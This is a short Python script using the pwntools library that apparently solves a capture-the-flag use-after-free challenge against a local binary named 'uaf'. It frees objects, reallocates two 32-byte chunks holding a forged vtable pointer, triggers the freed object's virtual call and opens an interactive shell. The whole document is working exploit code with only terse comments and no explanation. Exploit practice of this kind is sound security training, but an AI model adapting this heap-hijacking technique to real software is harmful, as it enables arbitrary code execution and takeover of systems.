from pwn import *

#context.log_level='debug'

p = process("./uaf");
#context.terminal = ['gnome-terminal','-x','sh','-c']
#gdb.attach(proc.pidof(p)[0])

p.sendline("3");  # free
p.sendline("2");  # after
p.sendline("32"); # bytes of memory to allocate; sizeof(string)=24,sizeof(int)=4,and vfp
p.send(p32(0x8049268-4)+'a'*28);
p.sendline("2");  # after
p.sendline("32"); # bytes of memory to allocate; sizeof(string)=24,sizeof(int)=4,and vfp
p.send(p32(0x8049268-4)+'a'*28);
p.sendline("1");  # use
p.interactive();
